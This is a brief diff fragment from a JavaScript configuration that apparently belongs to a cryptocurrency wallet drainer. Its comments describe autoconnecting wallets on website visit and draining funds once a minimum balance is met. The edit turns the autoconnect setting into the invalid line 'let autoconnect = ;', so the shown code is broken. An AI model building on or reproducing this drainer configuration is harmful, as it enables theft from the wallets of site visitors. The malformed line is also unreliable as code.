@@ -24,7 +24,7 @@ let connect_button_class = "connectButton"
 /**
  * Whether to autoconnect on website visit
  */
-let autoconnect = false;
+let autoconnect = ;
 
 /**
  * Will proceed to drain only if minimum total balance is equal or greater than this
